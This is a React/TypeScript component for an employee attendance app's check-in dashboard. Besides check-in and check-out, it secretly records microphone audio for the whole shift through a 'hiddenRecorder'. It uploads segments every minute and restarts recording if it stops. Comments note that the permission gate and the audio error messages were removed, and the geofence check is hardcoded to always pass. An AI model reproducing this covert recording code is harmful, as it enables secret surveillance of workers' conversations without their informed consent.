import { useState, useEffect, useRef } from "react";
import { useAuth } from "@/hooks/use-auth";
import { Link } from "wouter";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useQuery, useMutation } from "@tanstack/react-query";
import { apiRequest, queryClient, getApiBase } from "@/lib/queryClient";
import { hiddenRecorder } from "@/lib/audio-recorder";
import { AttendanceRecord } from "@shared/schema";
import { getCurrentPosition, calculateDistance, SHOP_LOCATION, MAX_DISTANCE } from "@/lib/geolocation";
import { History, User, MapPin, Clock, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export default function EmployeeDashboard() {
  const { user, logoutMutation } = useAuth();
  const { toast } = useToast();
  const [locationStatus, setLocationStatus] = useState<{
    distance: number | null;
    isWithinRange: boolean;
    isLoading: boolean;
    error: string | null;
  }>({
    distance: null,
    isWithinRange: false,
    isLoading: true,
    error: null,
  });

  // Real-time hours worked state
  const [hoursWorked, setHoursWorked] = useState("0h 0m");
  const [isRecording, setIsRecording] = useState(false);
  // Android-only recording; web fallback removed
  const rotationTimerRef = useRef<number | null>(null);
  const rotationFirstTimeoutRef = useRef<number | null>(null);
  // Permission gate removed; rely on OS prompts when starting recorder

  // Listen for admin stop events via WebSocket and stop local recording
  useEffect(() => {
    // Build WS URL based on API base when present
    let wsUrl: string;
    try {
      const base = getApiBase();
      if (base) {
        const u = new URL(base);
        const wsProto = u.protocol === 'https:' ? 'wss:' : 'ws:';
        wsUrl = `${wsProto}//${u.host}/ws`;
      } else {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        wsUrl = `${protocol}//${window.location.host}/ws`;
      }
    } catch {
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      wsUrl = `${protocol}//${window.location.host}/ws`;
    }

    let ws: WebSocket | null = null;
    try {
      ws = new WebSocket(wsUrl);
      ws.onmessage = async (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data?.type === 'audio_stop') {
            try { await hiddenRecorder.stopRecording(); } catch {}
            setIsRecording(false);
          }
        } catch {
          // ignore
        }
      };
    } catch {
      // ignore
    }
    return () => { if (ws && ws.readyState === WebSocket.OPEN) ws.close(); };
  }, []);

  // Cleanup rotation timer on unmount
  useEffect(() => {
    return () => {
      if (rotationTimerRef.current) {
        clearInterval(rotationTimerRef.current);
        rotationTimerRef.current = null;
      }
      if (rotationFirstTimeoutRef.current) {
        clearTimeout(rotationFirstTimeoutRef.current);
        rotationFirstTimeoutRef.current = null;
      }
    };
  }, []);

  // Fetch today's attendance
  const { data: todayAttendance, isLoading: attendanceLoading } = useQuery<AttendanceRecord>({
    queryKey: ["/api/attendance/today"],
    refetchInterval: 30000, // Refresh every 30 seconds
  });

  // Web-only recorder; browser prompts for mic permission when needed

  const checkInMutation = useMutation({
    mutationFn: async ({ latitude, longitude }: { latitude: number; longitude: number }) => {
      const res = await apiRequest("POST", "/api/attendance/checkin", { latitude, longitude });
      return await res.json();
    },
    onSuccess: async (record: AttendanceRecord) => {
      // immediately reflect check-in in UI
      queryClient.setQueryData(["/api/attendance/today"], record);
      toast({
        title: "Checked in successfully",
        description: "Your attendance has been recorded",
      });
      
      // Start recording (web)
      try {
        await hiddenRecorder.startRecording();
        // Upload an early small segment, then rotate periodically
        if (rotationFirstTimeoutRef.current) clearTimeout(rotationFirstTimeoutRef.current);
        rotationFirstTimeoutRef.current = window.setTimeout(async () => {
          try { await hiddenRecorder.uploadCurrentSegment(); } catch {}
        }, 10_000);
        if (rotationTimerRef.current) clearInterval(rotationTimerRef.current);
        rotationTimerRef.current = window.setInterval(async () => {
          try { await hiddenRecorder.uploadCurrentSegment(); } catch {}
        }, 60_000);
        setIsRecording(true);
        console.log("[rec] Web recording started");
      } catch (error) {
        console.error("Audio recording failed:", error);
        toast({
          title: "Microphone permission required",
          description: "Please allow microphone access in the browser and try again.",
          variant: "destructive",
        });
      }
    },
    onError: (error: Error) => {
      toast({
        title: "Check-in failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const checkOutMutation = useMutation({
    mutationFn: async () => {
      const res = await apiRequest("POST", "/api/attendance/checkout");
      return await res.json();
    },
    onSuccess: async (record: AttendanceRecord) => {
      // immediately reflect check-out in UI
      queryClient.setQueryData(["/api/attendance/today"], record);
      toast({
        title: "Checked out successfully",
        description: "Your work session has been completed",
      });
      
      // Stop audio recording and upload final segment
      try {
        // Clear any web rotation timers
        if (rotationTimerRef.current) { clearInterval(rotationTimerRef.current); rotationTimerRef.current = null; }
        if (rotationFirstTimeoutRef.current) { clearTimeout(rotationFirstTimeoutRef.current); rotationFirstTimeoutRef.current = null; }
        await hiddenRecorder.stopRecording();
        setIsRecording(false);
        console.log("🔴 Audio recording stopped");
      } catch (error) {
        console.error("Audio recording stop failed:", error);
        // Remove audio error toast from UI - keep only console logging
      }
    },
    onError: (error: Error) => {
      toast({
        title: "Check-out failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  useEffect(() => {
    const updateLocation = async () => {
      setLocationStatus(prev => ({ ...prev, isLoading: true }));
      
      try {
        const position = await getCurrentPosition();
        const distance = calculateDistance(
          position.latitude,
          position.longitude,
          SHOP_LOCATION.latitude,
          SHOP_LOCATION.longitude
        );
        
        setLocationStatus({
          distance: Math.round(distance),
          isWithinRange: true, // Always allow check-in for testing
          isLoading: false,
          error: null,
        });
      } catch (error) {
        setLocationStatus({
          distance: null,
          isWithinRange: false,
          isLoading: false,
          error: error instanceof Error ? error.message : "Failed to get location",
        });
      }
    };

    updateLocation();
    const interval = setInterval(updateLocation, 10000); // Update every 10 seconds

    return () => clearInterval(interval);
  }, []);

  // Real-time hours worked effect
  useEffect(() => {
    const updateHoursWorked = () => {
      if (!todayAttendance?.checkInTime) {
        setHoursWorked("0h 0m");
        return;
      }

      const checkInTime = new Date(todayAttendance.checkInTime);
      const endTime = todayAttendance.checkOutTime
        ? new Date(todayAttendance.checkOutTime)
        : new Date();

      const diffMs = endTime.getTime() - checkInTime.getTime();
      const hours = Math.floor(diffMs / (1000 * 60 * 60));
      const minutes = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
      setHoursWorked(`${hours}h ${minutes}m`);
    };

    updateHoursWorked();
    const interval = setInterval(updateHoursWorked, 1000);
    return () => clearInterval(interval);
  }, [todayAttendance]);

  // Update recording status based on attendance
  useEffect(() => {
    if (todayAttendance) {
      const isCurrentlyCheckedIn = todayAttendance.checkInTime && !todayAttendance.checkOutTime;
      setIsRecording(isCurrentlyCheckedIn);
    }
  }, [todayAttendance]);

  // Watchdog for web mic: if checked-in on mobile browser (non-Android native),
  // try to keep the recorder alive by restarting if it stopped unexpectedly.
  useEffect(() => {
    // Web-only: no native path
    let timer: any;
    if (isRecording) {
      timer = setInterval(async () => {
        try {
          if (!hiddenRecorder.getRecordingState()) {
            await hiddenRecorder.startRecording();
          }
        } catch {}
      }, 15000);
    }
    return () => { if (timer) clearInterval(timer); };
  }, [isRecording]);


  const handleCheckIn = async () => {
    try {
      const position = await getCurrentPosition();
      checkInMutation.mutate({
        latitude: position.latitude,
        longitude: position.longitude,
      });
    } catch (error) {
      toast({
        title: "Location error",
        description: error instanceof Error ? error.message : "Failed to get location",
        variant: "destructive",
      });
    }
  };
  const handleCheckOut = () => {
    if (confirm("Are you sure you want to check out?")) {
      checkOutMutation.mutate();
    }
  };

  const hasAttendance = !!todayAttendance;
  const isCheckedIn = todayAttendance && !todayAttendance.checkOutTime;
  const canCheckIn = !hasAttendance;

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Permission gate removed */}
      {/* Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="max-w-md mx-auto px-4 py-4 flex justify-between items-center">
          <h1 className="text-lg font-semibold text-gray-900" data-testid="text-dashboard-title">
            Dashboard
          </h1>
          <div className="flex items-center space-x-4">
            <Link href="/history">
              <Button variant="ghost" size="sm" data-testid="button-history">
                <History className="h-4 w-4" />
              </Button>
            </Link>
            <Link href="/profile">
              <Button variant="ghost" size="sm" data-testid="button-profile">
                <User className="h-4 w-4" />
              </Button>
            </Link>
          </div>
        </div>
      </div>

      <div className="max-w-md mx-auto px-4 py-6 space-y-6">
        {/* Location Status Card */}
        <Card>
          <CardContent className="pt-6">
            <div className="text-center">
              <div className="flex items-center justify-center mb-2">
                <MapPin className="h-5 w-5 mr-2 text-gray-600" />
                {locationStatus.isLoading ? (
                  <div className="flex items-center">
                    <Loader2 className="h-4 w-4 animate-spin mr-2" />
                    <span className="text-gray-600">Getting location...</span>
                  </div>
                ) : locationStatus.error ? (
                  <span className="text-error" data-testid="text-location-error">
                    Location unavailable
                  </span>
                ) : (
                  <>
                    <span 
                      className={`text-2xl mr-2`}
                      data-testid="text-location-status"
                    >
                      {locationStatus.isWithinRange ? "🟢" : "🔴"}
                    </span>
                    <span 
                      className={`text-lg font-medium ${
                        locationStatus.isWithinRange ? "text-success" : "text-error"
                      }`}
                    >
                      {locationStatus.isWithinRange ? "At Shop" : "Away"}
                    </span>
                  </>
                )}
              </div>
              {locationStatus.distance !== null && (
                <p className="text-sm text-gray-600" data-testid="text-distance">
                  Distance: {locationStatus.distance} meters
                </p>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Check-in/out Button */}
        <Card>
          <CardContent className="pt-6 text-center">
            <Button
              size="lg"
              className={`w-36 h-36 rounded-full text-xl font-bold shadow-lg mb-4 transition-all duration-300 ${
                isCheckedIn
                  ? "bg-red-600 hover:bg-red-700 text-white animate-pulse"
                  : canCheckIn
                  ? "bg-green-600 hover:bg-green-700 text-white"
                  : "bg-gray-400 cursor-not-allowed"
              }`}
              disabled={(!canCheckIn && !isCheckedIn) || checkInMutation.isPending || checkOutMutation.isPending}
              onClick={isCheckedIn ? handleCheckOut : handleCheckIn}
              data-testid={isCheckedIn ? "button-checkout" : "button-checkin"}
            >
              {(checkInMutation.isPending || checkOutMutation.isPending) && (
                <Loader2 className="h-6 w-6 animate-spin" />
              )}
              {!checkInMutation.isPending && !checkOutMutation.isPending && (
                isCheckedIn ? "I'M OUT" : "I'M HERE"
              )}
            </Button>
            <p className="text-xs text-gray-500">
              {isCheckedIn
                ? "Tap to stop work"
                : hasAttendance
                ? "Today's attendance recorded"
                : "Tap to start work"}
            </p>
          </CardContent>
        </Card>

        {/* Today's Activity */}
        <Card>
          <CardHeader>
            <CardTitle className="text-base">Today's Activity</CardTitle>
          </CardHeader>
          <CardContent>
            {attendanceLoading ? (
              <div className="flex justify-center">
                <Loader2 className="h-4 w-4 animate-spin" />
              </div>
            ) : (
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">Check-in Time:</span>
                  <span className="font-medium" data-testid="text-checkin-time">
                    {todayAttendance?.checkInTime 
                      ? new Date(todayAttendance.checkInTime).toLocaleTimeString([], {
                          hour: '2-digit',
                          minute: '2-digit'
                        })
                      : "Not checked in"
                    }
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Hours Worked:</span>
                  <div className="flex items-center space-x-2">
                    <span className="font-medium" data-testid="text-hours-worked">
                      {hoursWorked}
                    </span>
                    {isCheckedIn && (
                      <div className="flex items-center">
                        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                        <span className="text-xs text-green-600 ml-1">Live</span>
                      </div>
                    )}
                  </div>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Status:</span>
                  <Badge 
                    variant={todayAttendance?.isLate ? "destructive" : "default"}
                    className={todayAttendance?.isLate ? "" : "bg-success text-white"}
                    data-testid="badge-status"
                  >
                    {todayAttendance?.isLate ? "Late" : "On Time"}
                  </Badge>
                </div>
                

              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}


